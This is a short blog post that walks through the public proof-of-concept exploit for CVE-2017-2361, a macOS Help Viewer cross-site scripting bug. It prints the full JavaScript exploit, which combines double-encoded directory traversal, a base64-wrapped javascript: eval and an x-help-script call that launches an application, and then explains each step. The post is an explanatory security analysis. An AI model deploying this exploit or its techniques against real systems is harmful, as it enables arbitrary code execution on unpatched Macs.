---
layout: post
title:  "helpviewer xss CVE-2017-2361 breakdown"
date:   2017-03-24 11:18:44 +1100
categories: security
---

here is the exploitation taken from CVE-2017-2361. 
{% highlight javascript %}
 function main() {
   function second() {
     var f = document.createElement("iframe");
     f.onload = () => {
         f.contentDocument.location = "x-help-script://com.apple.machelp/"
                                     +"scpt/OpnApp.scpt?:Applications:Calculator.app";
     };
     
     f.src = "help:openbook=com.apple.safari.help";
     
     document.documentElement.appendChild(f);
   }
  
   var url = "javascript%253aeval(atob('" 
               + btoa(second.toString()) 
               + "'));\nsecond();";
 
   document.location = "help:///Applications/Safari.app/Contents/Resources/Safari.help/"
                       +"%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f/"
                       +"System/Library/PrivateFrameworks/Tourist.framework/Versions/A/"
                       + "Resources/en.lproj/offline.html?redirect=" + url;
 }
  
 main();
{% endhighlight %}

lets break it down

the first variable that is declared is the url. we have
{% highlight javascript %}
var url = "javascript%253aeval(atob('"
{% endhighlight %}

%25 = %

%3A = :

the string javascript%253aeval decodes as follows

javascript%3aeval

javascript:eval

gives us a javascript evaluation for the function atob() which decodes a base 64 string that is encoded first by the next line

{% highlight javascript %}
+ btoa(second.toString())
{% endhighlight %}

this is going to give us our second function that is encoded. with the decoding removed so far our url variable looks like this

{% highlight javascript %}
javascript:eval('function second() {
     var f = document.createElement("iframe");
     f.onload = () => {
         f.contentDocument.location = "x-help-script://com.apple.machelp/"
                                     +"scpt/OpnApp.scpt?:Applications:Calculator.app";
     };
     
     f.src = "help:openbook=com.apple.safari.help";
     
     document.documentElement.appendChild(f);
   }'); 
   second();
{% endhighlight %}

next we redirect the browser with document.location, lets take a look at the url we give to the browser

{% highlight javascript %}
"help:///Applications/Safari.app/Contents/Resources/Safari.help/"
 +"%25252f..%25252f..%25252f..%25252f..%25252f..%25252f..%25252f/"
 +"System/Library/PrivateFrameworks/Tourist.framework/Versions/A/"
 + "Resources/en.lproj/offline.html?redirect=" + url;
{% endhighlight %}

we open the help viewer with help:///Applications/Safari.app/Contents/Resources/Safari.help/ and then traverse up the directories using %25252f.. as 2f decodes to / giving us. this double encoded / bypasses the helpviewer check to see if the directory is valid 

{% highlight javascript %}
"help:///Applications/Safari.app/Contents/Resources/Safari.help//../../../../../..//System/Library/PrivateFrameworks/Tourist.framework/Versions/A/Resources/en.lproj/offline.html?redirect=" + url;
{% endhighlight %}

this url opens an offline page from Tourist.framework through helpviewer and then redirects to our url variable, this runs the javascript eval in the helpviewer application

{% highlight javascript %}
function second() {
    var f = document.createElement("iframe");
    f.onload = () => {
        f.contentDocument.location = "x-help-script://com.apple.machelp/"
                                    +"scpt/OpnApp.scpt?:Applications:Calculator.app";
    };
    
    f.src = "help:openbook=com.apple.safari.help";
    
    document.documentElement.appendChild(f);
  }
{% endhighlight %}

this creates an iframe in the helpviewer and uses it to run the OpnApp.scpt to execute some application

